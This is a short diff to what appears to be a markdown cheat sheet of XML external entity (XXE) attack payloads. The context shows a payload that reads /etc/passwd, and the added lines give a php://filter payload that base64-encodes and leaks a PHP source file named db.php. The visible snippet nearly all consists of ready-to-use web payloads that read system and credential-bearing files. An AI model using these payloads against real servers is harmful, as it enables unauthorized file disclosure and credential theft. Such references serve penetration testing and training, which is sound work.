@@ -6,6 +6,12 @@ XXE to read local files:
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
 ```
 
+XXE to read php files:
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php"> ]><pwn><id>&xxe;</id></pwn>
+```
+
 XXE to SSRF
 
 ```xml
